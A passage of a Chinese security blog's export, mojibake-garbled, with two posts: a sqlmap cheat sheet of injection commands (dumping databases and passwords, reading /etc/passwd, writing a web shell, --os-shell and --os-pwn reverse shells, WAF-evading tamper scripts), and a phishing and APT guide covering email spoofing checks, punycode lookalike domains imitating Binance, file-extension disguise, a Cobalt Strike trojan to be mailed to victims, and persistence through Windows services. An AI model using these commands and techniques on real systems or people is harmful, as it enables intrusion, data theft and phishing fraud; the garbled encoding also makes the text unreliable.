åˆ—ä¸¾æ•°æ®åº“.&#x2F;sqlmap.py -u â€œæ³¨å…¥åœ°å€â€ -v 1 --current-db &#x2F;&#x2F; å½“å‰æ•°æ®åº“.&#x2F;sqlmap.py -u â€œæ³¨å…¥åœ°å€â€ -v 1 --users &#x2F;&#x2F; åˆ—æ•°æ®åº“ç”¨æˆ·.&#x2F;sqlmap.py -u â€œæ³¨å…¥åœ°å€â€ -v 1 --current-user &#x2F;&#x2F; å½“å‰ç”¨æˆ·.&#x2F;sqlmap.py -u â€œæ³¨å…¥åœ°å€â€ -v 1 --tables -D â€œæ•°æ®åº“â€ &#x2F;&#x2F; åˆ—ä¸¾æ•°æ®åº“çš„è¡¨å.&#x2F;sqlmap.py -u â€œæ³¨å…¥åœ°å€â€ -v 1 --columns -T â€œè¡¨åâ€ -D â€œæ•°æ®åº“â€ &#x2F;&#x2F; è·å–è¡¨çš„åˆ—å.&#x2F;sqlmap.py -u â€œæ³¨å…¥åœ°å€â€ -v 1 --dump -C â€œå­—æ®µ,å­—æ®µâ€ -T â€œè¡¨åâ€ -D â€œæ•°æ®åº“â€ &#x2F;&#x2F; è·å–è¡¨ä¸­çš„æ•°æ®ï¼ŒåŒ…å«åˆ—å·²ç»å¼€å§‹æ‹–åº“äº†ï¼ŒSQLMAPæ˜¯éå¸¸äººæ€§åŒ–çš„ï¼Œå®ƒä¼šå°†è·å–çš„æ•°æ®å­˜å‚¨sqlmap&#x2F;output&#x2F;ä¸­ã€ã€ã€2. sqlmap postæ³¨å…¥æˆ‘ä»¬åœ¨ä½¿ç”¨Sqlmapè¿›è¡Œpostå‹æ³¨å…¥æ—¶ï¼Œç»å¸¸ä¼šå‡ºç°è¯·æ±‚é—æ¼å¯¼è‡´æ³¨å…¥å¤±è´¥çš„æƒ…å†µã€‚è¿™é‡Œåˆ†äº«ä¸€ä¸ªå°æŠ€å·§ï¼Œå³ç»“åˆburpsuiteæ¥ä½¿ç”¨sqlmapï¼Œç”¨è¿™ç§æ–¹æ³•è¿›è¡Œpostæ³¨å…¥æµ‹è¯•ä¼šæ›´å‡†ç¡®ï¼Œæ“ä½œèµ·æ¥ä¹Ÿéå¸¸å®¹æ˜“ã€‚1. æµè§ˆå™¨æ‰“å¼€ç›®æ ‡åœ°å€http:&#x2F;&#x2F; www.2cto.com &#x2F;Login.asp2. é…ç½®burpä»£ç†(127.0.0.1:8080)ä»¥æ‹¦æˆªè¯·æ±‚3. ç‚¹å‡»loginè¡¨å•çš„submitæŒ‰é’®4. å¦‚ä¸‹å›¾ï¼Œè¿™æ—¶å€™Burpä¼šæ‹¦æˆªåˆ°äº†æˆ‘ä»¬çš„ç™»å½•POSTè¯·æ±‚5. æŠŠè¿™ä¸ªpostè¯·æ±‚å¤åˆ¶ä¸ºtxt, æˆ‘è¿™å‘½åä¸ºsearch-test.txt ç„¶åæŠŠå®ƒæ”¾è‡³sqlmapç›®å½•ä¸‹6. è¿è¡Œsqlmapå¹¶ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤ï¼š.&#x2F;sqlmap.py -r search-test.txt -p tfUPassè¿™é‡Œå‚æ•°-r æ˜¯è®©sqlmapåŠ è½½æˆ‘ä»¬çš„postè¯·æ±‚rsearch-test.txtï¼Œè€Œ-p å¤§å®¶åº”è¯¥æ¯”è¾ƒç†Ÿæ‚‰ï¼ŒæŒ‡å®šæ³¨å…¥ç”¨çš„å‚æ•°ã€‚3ï¼Œsqlmap cookiesæ³¨å…¥sqlmap.py -u &quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;base.php&quot; --cookies &quot;id&#x3D;1&quot; --dbs --level 22.é»˜è®¤æƒ…å†µä¸‹SQLMAPåªæ”¯æŒGET&#x2F;POSTå‚æ•°çš„æ³¨å…¥æµ‹è¯•ï¼Œä½†æ˜¯å½“ä½¿ç”¨--level å‚æ•°ä¸”æ•°å€¼&gt;&#x3D;2çš„æ—¶å€™ä¹Ÿä¼šæ£€æŸ¥cookieæ—¶é¢çš„å‚æ•°ï¼Œå½“&gt;&#x3D;3çš„æ—¶å€™å°†æ£€æŸ¥User-agentå’ŒRefererï¼Œé‚£ä¹ˆè¿™å°±å¾ˆç®€å•äº†ï¼Œæˆ‘ä»¬ç›´æ¥åœ¨åŸæœ‰çš„åŸºç¡€ä¸Šé¢åŠ ä¸Š --level 2 å³å¯åˆ©ç”¨sqlmap cookiesæ³¨å…¥çªç ´ç”¨æˆ·ç™»å½•ç»§ç»­æ³¨å…¥å…ˆæŠŠç”¨æˆ·ç™»é™†çš„cookieæ‹¿åˆ°å§ï¼Œåœ¨æ”¶è—å¤¹æ·»åŠ ä¸€ä¸ªé“¾æ¥cookieså±æ€§ï¼šåå­—è‡ªå·±å–javascript:alert(document.cookie)ï¼Œï¼Œéœ€è¦è·å–å½“å‰cookieçš„æ—¶å€™ï¼Œç›´æ¥ç‚¹ä¸€ä¸‹è¿™ä¸ªé“¾æ¥ï¼Œç„¶åå¤åˆ¶ä¸€ä¸‹å¼¹å‡ºå¯¹è¯æ¡†é‡Œçš„cookieå€¼å°±æå®šäº†sqlmap.py -u http:&#x2F;&#x2F;x.x.x.x&#x2F;Down.aspx?tid&#x3D;2 -p tid --dbms mssql --cookie&#x3D;&quot;info&#x3D;username&#x3D;test&quot;-pæ˜¯æŒ‡æŒ‡å®šå‚æ•°æ³¨å…¥4. sqlmapé‡åˆ°urlé‡å†™çš„æ³¨å…¥å“ªé‡Œå­˜åœ¨æ³¨å…¥å°±åŠ ä¸Š * å·1.&#x2F;sqlmap.py -u &quot;http:&#x2F;&#x2F;www.cunlide.com&#x2F;id1&#x2F;1*&#x2F;id2&#x2F;2&quot;5.sqlmap ç¼–ç ç»•wafæ³¨å…¥.&#x2F;sqlmap.py -u http:&#x2F;&#x2F;127.0.0.1&#x2F;test.php?id&#x3D;1 -v 3 â€“dbms â€œMySQLâ€ â€“technique U -p id â€“batch â€“tamper &quot;space2morehash.py&quot;åœ¨sqlmap çš„ tamperç›®å½•ä¸‹æœ‰å¾ˆå¤šspace2morehash.py ç¼–ç è„šæœ¬è‡ªè¡ŒåŠ è½½sqlmapè¯»æ–‡ä»¶sqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot;--level&#x3D;3 --smart --dbms &quot;Mysql&quot;--file-read â€œ&#x2F;etc&#x2F;passwd&quot;sqlmapå†™æ–‡ä»¶sqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot;--level&#x3D;3 --smart --dbms &quot;Mysql&quot;--file-write &#x2F;localhost&#x2F;mm.php --file-dest&#x2F;var&#x2F;www&#x2F;html&#x2F;xx.php -v 2sqlmapåˆ†æ®µè„±è£¤sqlmap.py -u url -D &quot;data&quot; -T &quot;tables&quot; -C &quot;username,password,email&quot; --dump --threads&#x3D;5 --start&#x3D;1 --stop&#x3D;5000å…¶ä»–åŸºç¡€ï¼šsqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot; --level&#x3D;3 --smart --dbms &quot;Mysql&quot; --current-user #è·å–å½“å‰ç”¨æˆ·åç§°sqlmap -u &quot;http:&#x2F;&#x2F;www.xxoo.com&#x2F;news?id&#x3D;1&quot; --level&#x3D;3 --smart --dbms &quot;Mysql&quot; --current-db #è·å–å½“å‰æ•°æ®åº“åç§°sqlmap -u &quot;http:&#x2F;&#x2F;www.xxoo.com&#x2F;news?id&#x3D;1&quot; --level&#x3D;3 --smart --dbms &quot;Mysql&quot;--tables -D &quot;db_name&quot; #åˆ—è¡¨åsqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot; --level&#x3D;3 --smart --dbms &quot;Mysql&quot; --columns -T &quot;tablename&quot; users-D &quot;db_name&quot; -v 0 #åˆ—å­—æ®µsqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot; --level&#x3D;3 --smart --dbms &quot;Mysql&quot; --dump -C &quot;column_name&quot; -T &quot;table_name&quot; -D &quot;db_name&quot; -v 0 #è·å–å­—æ®µå†…å®¹******************ä¿¡æ¯è·å–******************sqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot;--level&#x3D;3 --smart --dbms &quot;Mysql&quot; --users #åˆ—æ•°æ®åº“ç”¨æˆ·sqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot;--level&#x3D;3 --smart --dbms &quot;Mysql&quot; --dbs#åˆ—æ•°æ®åº“sqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot;--level&#x3D;3 --smart --dbms &quot;Mysql&quot;--passwords #æ•°æ®åº“ç”¨æˆ·å¯†ç sqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot;--level&#x3D;3 --smart --dbms &quot;Mysql&quot;--passwords-U root -v 0 #åˆ—å‡ºæŒ‡å®šç”¨æˆ·æ•°æ®åº“å¯†ç sqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot;--level&#x3D;3 --smart --dbms &quot;Mysql&quot; --dump-all -v 0 #åˆ—å‡ºæ‰€æœ‰æ•°æ®åº“æ‰€æœ‰è¡¨sqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot;--level&#x3D;3 --smart --dbms &quot;Mysql&quot;--privileges #æŸ¥çœ‹æƒé™sqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot;--level&#x3D;3 --smart --dbms &quot;Mysql&quot;--privileges -U root #æŸ¥çœ‹æŒ‡å®šç”¨æˆ·æƒé™sqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot;--level&#x3D;3 --smart --dbms &quot;Mysql&quot; --is-dba -v 1 #æ˜¯å¦æ˜¯æ•°æ®åº“ç®¡ç†å‘˜sqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot;--level&#x3D;3 --smart --dbms &quot;Mysql&quot; --roles #æšä¸¾æ•°æ®åº“ç”¨æˆ·è§’è‰²sqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot;--level&#x3D;3 --smart --dbms &quot;Mysql&quot;--udf-inject #å¯¼å…¥ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°ï¼ˆè·å–ç³»ç»Ÿæƒé™ï¼ï¼‰sqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot;--level&#x3D;3 --smart --dbms &quot;Mysql&quot;--dump-all --exclude-sysdbs -v 0 #åˆ—å‡ºå½“å‰åº“æ‰€æœ‰è¡¨sqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot;--level&#x3D;3 --smart --dbms &quot;Mysql&quot; --union-check #æ˜¯å¦æ”¯æŒunion æ³¨å…¥sqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot;--level&#x3D;3 --smart --dbms &quot;Mysql&quot;--union-cols #union æŸ¥è¯¢è¡¨è®°å½•sqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot;--level&#x3D;3 --smart --dbms &quot;Mysql&quot; --union-test #union è¯­å¥æµ‹è¯•sqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot;--level&#x3D;3 --smart --dbms &quot;Mysql&quot; --union-use --banner #é‡‡ç”¨union æ³¨å…¥sqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot;--level&#x3D;3 --smart --dbms &quot;Mysql&quot;--union-test --union-tech orderby #union é…åˆ order bysqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot;--level&#x3D;3 --smart --dbms &quot;Mysql&quot;--method &quot;POST&quot; -- data &quot;id&#x3D;1&amp;cat&#x3D;2&quot; #postæ³¨å…¥sqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot;--level&#x3D;3 --smart --dbms &quot;Mysql&quot;--cookie &quot;COOKIE_VALUE&quot; #cookieæ³¨å…¥sqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot;--level&#x3D;3 --smart --dbms &quot;Mysql&quot;-b #è·å–bannerä¿¡æ¯sqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot; --level&#x3D;3 --smart-v 1 -f #æŒ‡çº¹åˆ¤åˆ«æ•°æ®åº“ç±»å‹sqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot; --level&#x3D;3 --smart--proxy&quot;http:&#x2F;&#x2F;127.0.0.1:8118&quot; #ä»£ç†æ³¨å…¥sqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot;--string&quot;STRING_ON_TRUE_PAGE&quot; #æŒ‡å®šå…³é”®è¯sqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot;--level&#x3D;3 --smart --dbms &quot;Mysql&quot;--sql-shell #æ‰§è¡ŒæŒ‡å®šsqlå‘½ä»¤sqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot;--level&#x3D;3 --smart --dbms &quot;Mysql&quot;--os-cmd&#x3D;whoami #æ‰§è¡Œç³»ç»Ÿå‘½ä»¤sqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot;--level&#x3D;3 --smart --dbms &quot;Mysql&quot;--os-shell #ç³»ç»Ÿäº¤äº’shellsqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot;--level&#x3D;3 --smart --dbms &quot;Mysql&quot;--os-pwn #åå¼¹shellsqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot;--level&#x3D;3 --smart --dbms &quot;Mysql&quot;--reg-read #è¯»å–winç³»ç»Ÿæ³¨å†Œè¡¨sqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot;--level&#x3D;3 --smart --dbms &quot;Mysql&quot; --dbs-o &quot;sqlmap.log&quot; #ä¿å­˜è¿›åº¦sqlmap -u &quot;http:&#x2F;&#x2F;url&#x2F;news?id&#x3D;1&quot;--level&#x3D;3 --smart --dbms &quot;Mysql&quot; --dbs -o &quot;sqlmap.log&quot; --resume #æ¢å¤å·²ä¿å­˜è¿›åº¦.&#x2F;sqlmap.py -u â€œhttp:&#x2F;&#x2F;www.91ri.org&#x2F; id1&#x2F;1*&#x2F;id2&#x2F;2â€³&quot;Show.asp&quot; --cookie &quot;id&#x3D;9&quot; --table --level 2--forms--data &quot;data&quot;--delay 0.5--safe-freq 25-v 3 --dbs --batch --tamper &quot;base64encode.py&quot;sqlmap.py -u url -D &quot;data&quot; -T &quot;tables&quot; -C &quot;username,password,email&quot; --dump-all -v 0","categories":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://zhangyanlady.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}],"tags":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://zhangyanlady.github.io/tags/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"},{"name":"æ¸—é€æµ‹è¯•","slug":"æ¸—é€æµ‹è¯•","permalink":"https://zhangyanlady.github.io/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"}],"keywords":[{"name":"ç½‘ç»œå®‰å…¨","slug":"ç½‘ç»œå®‰å…¨","permalink":"https://zhangyanlady.github.io/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/"}]},{"title":"ç¤¾å·¥ã€APT","slug":"ç¤¾å·¥ã€APT","date":"2020-02-24T12:23:45.000Z","updated":"2020-09-20T08:57:30.525Z","comments":true,"path":"2020/02/24/ç¤¾å·¥ã€APT/","link":"","permalink":"https://zhangyanlady.github.io/2020/02/24/%E7%A4%BE%E5%B7%A5%E3%80%81APT/","excerpt":"","text":"æ€»ç»“å›¾ ä¼ªé€ é‚®ä»¶å‘é€è¯•éªŒè¦æƒ³æŸ¥çœ‹ä¸€ä¸ªåŸŸåæ˜¯å¦é…ç½®äº†SPFï¼Œå¯ä»¥ç”¨nslookupæˆ–è€…digæŸ¥çœ‹ï¼š nslookup -type=txt ***.com.cn dig -t txt 163.com æœªé…ç½®çš„æ˜¯è¿™æ ·ï¼š é…ç½®äº†çš„æ˜¯è¿™æ · SPFå¯ä»¥é…ç½®ä¸ºipï¼Œä¹Ÿå¯ä»¥é…ç½®ä¸ºåŸŸå é’“é±¼åŸŸåè¯•éªŒæœ‰äº†æ–‡æ¡ˆï¼Œæ€ä¹ˆèƒ½è®©é‚®ä»¶çœ‹èµ·æ¥çœŸå®æ€§æ›´é«˜å‘¢ï¼Ÿæœ€ç®€å•çš„å°±æ˜¯ç”¨è¶…é“¾æ¥,æŠŠå…ƒç´ å†…å®¹æ”¹æˆæƒ³è¦ä»¿å†’çš„åŸŸåï¼Œåœ¨é‚®ç®±é¡µé¢ä¸Šï¼Œå°±ä¼šç›´æ¥æ˜¾ç¤ºå…ƒç´ çš„å†…å®¹ï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä¸€äº›ä¸ç›®æ ‡ç›¸ä¼¼çš„åŸŸåã€‚æ¯”å¦‚ç”¨0ä»£æ›¿oï¼Œç”¨1ä»£æ›¿lï¼Œç”¨vvä»£æ›¿wç­‰ç­‰ï¼Œè¿™å°±éœ€è¦å‘æŒ¥ä½ çš„æƒ³è±¡æ¥å¯»æ‰¾ç›¸ä¼¼çš„åŸŸåï¼š http://www.taoba0.com/ http://www.a1iyun.com å¦‚æœæ‰¾ä¸åˆ°è¿™æ ·å½¢ä¼¼çš„åŸŸåæˆ–è€…è¿™ç§åŸŸåæ¯”è¾ƒè´µçš„æƒ…å†µä¸‹ï¼Œå¯ä»¥å°è¯•ä¸€äº›æ›´éªšçš„æ“ä½œã€‚ã€‚ä¾‹å¦‚ä½¿ç”¨å›½é™…åŸŸåè¿™æ ·çš„åŸŸåæ˜¯æ€ä¹ˆæ³¨å†Œçš„å‘¢ï¼Ÿåœ¨äº†è§£æ€ä¹ˆæ³¨å†Œä¸€ä¸ªè¿™æ ·çš„åŸŸåå‰ï¼Œéœ€è¦å…ˆäº†è§£ä»€ä¹ˆæ˜¯å›½é™…åŸŸåï¼ˆInternationalized domain name, IDNï¼‰ã€‚ IDNï¼š æ˜¯æŒ‡åœ¨åŸŸåä¸­åŒ…å«è‡³å°‘ä¸€ä¸ªç‰¹æ®Šè¯­è¨€å­—æ¯çš„åŸŸåï¼Œç‰¹æ®Šè¯­è¨€åŒ…æ‹¬ä¸­æ–‡ã€æ³•æ–‡ã€æ‹‰ä¸æ–‡ç­‰ã€‚åœ¨DNSç³»ç»Ÿå·¥ä½œä¸­ï¼Œè¿™ç§åŸŸåä¼šè¢«ç¼–ç æˆASCIIå­—ç¬¦ä¸²ï¼Œå¹¶é€šè¿‡Punycodeè¿›è¡Œç¿»è¯‘ã€‚ Punycodeæ˜¯ä¸€ä¸ªæ ¹æ®RFC 3492æ ‡å‡†è€Œåˆ¶å®šçš„ç¼–ç ç³»ç»Ÿ,ä¸»è¦ç”¨äºæŠŠåŸŸåä»åœ°æ–¹è¯­è¨€æ‰€é‡‡ç”¨çš„Unicodeç¼–ç è½¬æ¢æˆä¸ºå¯ç”¨æ–¼DNSç³»ç»Ÿçš„ç¼–ç ã€‚ ç›®å‰ï¼Œå› ä¸ºæ“ä½œç³»ç»Ÿçš„æ ¸å¿ƒéƒ½æ˜¯è‹±æ–‡ç»„æˆï¼ŒDNSæœåŠ¡å™¨çš„è§£æä¹Ÿæ˜¯ç”±è‹±æ–‡ä»£ç äº¤æ¢ï¼Œæ‰€ä»¥DNSæœåŠ¡å™¨ä¸Šå¹¶ä¸æ”¯æŒç›´æ¥çš„ä¸­æ–‡åŸŸåè§£æï¼Œæ‰€æœ‰ä¸­æ–‡åŸŸåçš„è§£æéƒ½éœ€è¦è½¬æˆpunycodeç ï¼Œç„¶åç”±DNSè§£æpunycodeç ã€‚å…¶å®ç›®å‰æ‰€è¯´çš„å„ç§ä¸»æµæµè§ˆå™¨éƒ½å®Œç¾æ”¯æŒIDNåŸŸåï¼Œæµè§ˆå™¨é‡Œé¢ä¼šè‡ªåŠ¨å¯¹IDNåŸŸåè¿›è¡ŒPunycodeè½¬ç ï¼Œè€Œåœ°å€æ ä¾æ—§æ˜¾ç¤ºçš„æ˜¯åŸå§‹è¾“å…¥çš„IDNåŸŸåã€‚ æ‰€ä»¥ï¼Œè¦æƒ³æ³¨å†Œâ€œå¸å®‰â€çš„è¿™ä¸ªåŸŸåï¼š www.biá¹‡aá¹‡ce.com å…¶å®åªéœ€è¦æ³¨å†Œä»–ç»è¿‡punycodeè½¬ç åçš„åŸŸåï¼š www.xn--biace-4l1bb.com ç„¶åè®©ç›®æ ‡è®¿é—®www.biá¹‡aá¹‡ce.comï¼Œåœ¨åœ°å€æ ä¸­å°±å¾ˆéš¾è¢«å‘ç°ã€‚[punycodeåœ¨çº¿è½¬æ¢å·¥å…·ï¼šhttp://tools.jb51.net/punycode/index.php](https://links.jianshu.com/go?to=http%3A%2F%2Ftools.jb51.net%2Fpunycode%2Findex.php) UniCodeç¼–ç è¡¨https://www.cnblogs.com/csguo/p/7401874.html è¿™æ ·æˆ‘ä»¬ä¾¿å¯ä»¥ä¼ªé€ åŸŸåé’“é±¼ ç„¶åå°†IDNåŸŸåä»¥è¶…é“¾æ¥å†™å…¥é‚®ä»¶ https**è¯ä¹¦** æœ€åè¦è¯´ä¸€ç‚¹ï¼Œå°±æ˜¯httpsè¯ä¹¦ï¼Œå‰è¾¹ä»¿å†’çš„å†åƒï¼Œä½†å¦‚æœæµè§ˆå™¨ä¸Šç›´æ¥å‡ºç°äº†ä¸å®‰å…¨è­¦å‘Šæˆ–è€…çº¢æ–œæ ï¼Œä¹Ÿå¾ˆå®¹æ˜“å¼•èµ·ç›®æ ‡çš„è­¦æƒ•ã€‚æ‰€ä»¥åœ¨æ¡ä»¶å…è®¸çš„æƒ…å†µä¸‹ï¼Œå°½é‡åšæˆåšå…¨å¥—ï¼Œç°åœ¨æ™®é€šçš„httpsè¯ä¹¦ä¹Ÿæ˜¯å¾ˆä¾¿å®œçš„ã€‚è¯ä¹¦çš„å…·ä½“ç”³è¯·ä½¿ç”¨å°±ä¸åœ¨è¿™ç»†è¯´äº†ï¼Œç™¾åº¦ä¸€ä¸‹ï¼Œå…¨éƒ½çŸ¥é“ã€‚ å®Œæˆä¼ªé€ æ‰©å±•åè¯•éªŒä½¿ç”¨KilerRatå·¥å…·ï¼š æˆ‘ä»¬ä¹Ÿå¯ä»¥ä½¿ç”¨å›¾æ ‡ä¿®æ”¹å™¨æ”¹å›¾æ ‡ å®Œæˆæ–‡ä»¶å›°ç»‘è¯•éªŒ å®Œæˆç»¼åˆaptæ”»å‡»å·¥å…·csæœ¨é©¬ä¸Šçº¿å®éªŒCobaltStrikeæ˜¯ä¸€æ¬¾ç¾å›½Red Teamå¼€å‘çš„æ¸—é€æµ‹è¯•ç¥å™¨ï¼Œå¸¸è¢«ä¸šç•Œäººç§°ä¸ºCSã€‚æœ€è¿‘è¿™ä¸ªå·¥å…·å¤§ç«ï¼Œæˆä¸ºäº†æ¸—é€æµ‹è¯•ä¸­ä¸å¯ç¼ºå°‘çš„åˆ©å™¨ã€‚å…¶æ‹¥æœ‰å¤šç§åè®®ä¸»æœºä¸Šçº¿æ–¹å¼ï¼Œé›†æˆäº†ææƒï¼Œå‡­æ®å¯¼å‡ºï¼Œç«¯å£è½¬å‘ï¼Œsocketä»£ç†ï¼Œofficeæ”»å‡»ï¼Œæ–‡ä»¶æ†ç»‘ï¼Œé’“é±¼ç­‰åŠŸèƒ½ã€‚åŒæ—¶ï¼ŒCobalt Strikeè¿˜å¯ä»¥è°ƒç”¨Mimikatzç­‰å…¶ä»–çŸ¥åå·¥å…·ï¼Œå› æ­¤å¹¿å—é»‘å®¢å–œçˆ±ã€‚ CobaltStrikeåˆ†ä¸ºå®¢æˆ·ç«¯å’ŒæœåŠ¡ç«¯å¯åˆ†å¸ƒå¼æ“ä½œå¯ä»¥ååŒä½œæˆ˜ã€‚ä½†ä¸€å®šè¦æ¶è®¾åœ¨å¤–ç½‘ä¸Šã€‚å½“ç„¶ä½ çŸ¥é“åˆ©ç”¨è¿™æ¬¾å·¥å…·ä¸»è¦ç”¨äºå†…ç½‘æ¸—é€ä»¥åŠAPTæ”»å‡»ã€‚ é¡¹ç›®å®˜ç½‘:https://www.cobaltstrike.com å®éªŒç¯å¢ƒï¼šæœåŠ¡å™¨ç«¯ï¼ˆLinuxï¼‰ï¼š192.168.0.109 é¶æœºï¼ˆwindowsï¼‰:192.168.19.130 ä½¿ç”¨cobaltstrike 3.14 å®éªŒæ­¥éª¤å°†å·¥å…·ä¸Šä¼ åˆ°kaliç³»ç»Ÿä¸­è¿è¡Œæ—¶ç»™777æƒé™ root@kali:/mnt/cobaltstrike# chmod 777 /mnt/cobaltstrike/ ä¸€ã€å¯åŠ¨ï¼Œè¿æ¥æœåŠ¡å™¨å¯åŠ¨æœåŠ¡ç«¯ï¼š(test ä¸ºå¾…ä¼šé¶æœºè¿æ¥æœåŠ¡å™¨çš„å¯†ç ï¼‰./teamserver 192.168.0.109 test Testä¸ºå¯†ç hashå¯†ç è¦ä¸å®¢æˆ·ç«¯ä¸€æ ·è¯ºä¸ä¸€æ ·åˆ™æ­¤è½¯ä»¶å­˜åœ¨åé¢ å¯†ç è®¾ç½®ä¸ºtestä½ å¯ä»¥è®¾ç½®ä¸ºå…¶å®ƒ å®¢æˆ·ç«¯è¿æ¥æœåŠ¡å™¨è¿è¡Œï¼šcs.bat å¯åŠ¨å®¢æˆ·ç«¯ï¼Œè¾“å…¥ipï¼Œå¯†ç ï¼Œç«¯å£ï¼Œç”¨æˆ·é»˜è®¤ å¦‚æœå®¢æˆ·ç«¯ æ˜¯Linuxæ“ä½œç³»ç»Ÿåˆ™è¿è¡Œä»¥ä¸‹å‘½ä»¤ï¼Œå¯åŠ¨å®¢æˆ·ç«¯ï¼šjava -Dfile.encoding=UTF-8 -javaagent:CobaltStrikeCN.jar -XX:ParallelGCThreads=4 -XX:+AggressiveHeap -XX:+UseParallelGC -jar cobaltstrike.jar åˆ›å»ºç›‘å¬å™¨ã€‚ åˆ›å»ºç›‘å¬å™¨ 1ã€ç‚¹å‡» Cobalt Strike -&gt; Listeners-&gt;Addï¼Œå…¶ä¸­å†…ç½®äº†å…«ä¸ªPayloadï¼Œ wndows/beacon_dns/reverse_dns_txt windows/beacon_http/reverse_http windows/beacon_https/reverse_https windows/beacon_bind_pipe windows/beacon_tcp windows/beacon_extc2 windows/foreign/reverse_http windows/foreign/reverse_https ç”Ÿæˆæœ¨é©¬åˆ›å»ºpayload è®©ä¸»æœºä¸Šçº¿ è¿è¡Œè¯¥exeä¸»æœºæˆåŠŸä¸Šçº¿ï¼šå¯ä»¥æŸ¥çœ‹ä¸Šçº¿ä¸»æœºçš„ç£ç›˜ä¿¡æ¯ï¼Œè¿›è¡Œç«¯å£æ‰«æï¼ŒæŸ¥çœ‹è¿›ç¨‹ç­‰ä¿¡æ¯ã€‚ åŒç†å¦‚æœå°†ç”Ÿæˆçš„artifact.exeä½œä¸ºé™„ä»¶å‘é€ç»™å…¶ä»–äººï¼Œåªè¦æœ‰äººç‚¹å‡»ï¼Œåˆ™ä»–çš„æœºå™¨ä¼šä¸Šçº¿ã€‚ä¸è¿‡ç°åœ¨çš„ç”µè„‘éƒ½è£…äº†æ€æ¯’è½¯ä»¶ï¼Œæ‰€ä»¥payloadéœ€åšå…æ€ã€‚è¿™ä¸ªåç»­åœ¨ç ”å‘ HttpsPayloadåº”ç”¨ä¼˜ç‚¹ï¼šå¯èƒ½è¿‡è¡Œä¸ºæŸ¥æ€ã€å¦å¤–administratorè¿è¡Œå¯ç›´æ¥æå‡ä¸ºsystemæƒé™ ç¬¬ä¸€æ­¥ Windows Serviceéœ€è¦å‘æ“ä½œç³»ç»Ÿæ³¨å†ŒEXEç›´æ¥è¿è¡Œ ç¬¬äºŒæ­¥ï¼šåˆ›å»ºæœåŠ¡ Sc create test binpath= â€c:\\test.exeâ€ //åˆ›å»ºçš„æœåŠ¡åï¼ŒbinPathåé¢æ˜¯è¿è¡Œexeæ–‡ä»¶çš„æ‰€åœ¨è·¯å¾„ åˆ›å»ºä¸€ä¸ªè·¯å¾„ä¸€èˆ¬æ”¾åœ¨C:\\Windows\\System32ä¸‹å› ä¸ºè¿™ä¸ªè·¯å¾„æ‰§è¡Œæ–‡ä»¶æœ€å¤š start= auto displayname= â€testâ€ //å°†exeæ³¨å†Œä¸ºwindowsæœåŠ¡ displaynameæœåŠ¡å™¨åç§° Sc start test //å¼€å¯è¿™ä¸ªæœåŠ¡ Sc delete test //åˆ é™¤è¿™ä¸ªæœåŠ¡ Sc top test //é¦–å…ˆä½¿ç”¨è¿™ä¸ªæœåŠ¡ scé…ç½®æœåŠ¡ æœ‰ä»¥ä¸‹é›†ä¸­æ–¹å¼ï¼š sc config æœåŠ¡å start= AUTO (è‡ªåŠ¨) sc config æœåŠ¡å start= DEMAND (æ‰‹åŠ¨) sc config æœåŠ¡å start= DISABLED(ç¦ç”¨) å…³äºSC 